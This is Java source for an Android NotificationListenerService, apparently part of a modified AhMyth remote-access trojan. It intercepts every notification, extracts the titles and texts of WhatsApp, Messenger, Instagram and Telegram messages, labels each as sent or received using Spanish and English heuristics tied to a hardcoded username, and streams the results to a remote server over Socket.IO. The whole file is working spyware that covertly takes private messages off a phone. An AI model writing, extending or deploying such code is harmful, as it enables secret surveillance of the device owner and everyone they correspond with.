package ahmyth.mine.king.ahmyth;

import android.annotation.SuppressLint;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONObject;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

@SuppressLint("OverrideAbstract")
public class NotificationListener extends NotificationListenerService {

    private static final Set<String> MESSENGER_PACKAGES = new HashSet<>(Arrays.asList(
        "com.whatsapp",
        "com.facebook.orca",
        "com.instagram.android",
        "org.telegram.messenger"
    ));

    private static final String USERNAME = "Jesus V";

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.i("NotificationListener", "*** Listener CONNECTED ***");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        String pkg = sbn.getPackageName();
        CharSequence titleCs = sbn.getNotification().extras.getCharSequence("android.title");
        String title = (titleCs != null) ? titleCs.toString() : "";
        CharSequence textCs = sbn.getNotification().extras.getCharSequence("android.text");
        String text = (textCs != null) ? textCs.toString() : "";

        Log.d("NotificationListener", "APP: " + pkg);
        Log.d("NotificationListener", "TITLE: " + title);
        Log.d("NotificationListener", "TEXT: " + text);

        try {
            JSONObject object = new JSONObject();
            object.put("package", pkg);
            object.put("title", title);
            object.put("text", text);

            if (MESSENGER_PACKAGES.contains(pkg)) {
                String direction = "received"; // default

                // Heurística para "sent"
                if (
                    title.equalsIgnoreCase(USERNAME) ||
                    title.equalsIgnoreCase("Tú") || title.equalsIgnoreCase("You") ||
                    text.toLowerCase().contains("you sent") ||
                    text.toLowerCase().contains("enviaste") ||
                    text.toLowerCase().contains("has enviado") ||
                    text.toLowerCase().contains("enviado") ||
                    text.startsWith("Tú:") || text.startsWith("You:")
                ) {
                    direction = "sent";
                }

                // Heurística para "received"
                if (
                    text.toLowerCase().contains("nuevo mensaje") ||
                    text.toLowerCase().contains("new message") ||
                    text.toLowerCase().contains("mensajes nuevos") ||
                    text.toLowerCase().contains("te envió un mensaje")
                ) {
                    direction = "received";
                }

                object.put("direction", direction);

                // IGNORA salientes con texto genérico (WhatsApp)
                if (pkg.equals("com.whatsapp") && direction.equals("sent") &&
                    (text.equalsIgnoreCase("Mensaje") || text.equalsIgnoreCase("Message"))) {
                    Log.d("NotificationListener", "Ignorando notificación de mensaje enviado sin contenido real");
                    return;
                }
            }

            if (IOSocket.getInstance().getIoSocket() != null &&
                IOSocket.getInstance().getIoSocket().connected()) {
                IOSocket.getInstance().getIoSocket().emit("notification", object);
                Log.d("NotificationListener", "Notificación emitida por Socket.IO: " + object.toString());
            } else {
                Log.e("NotificationListener", "Socket NO conectado, no se puede emitir notificación");
            }
        } catch (Exception e) {
            Log.e("NotificationListener", "Error sending notification event", e);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
        Log.i("NotificationListener", "*** Notification REMOVED ***");
    }
}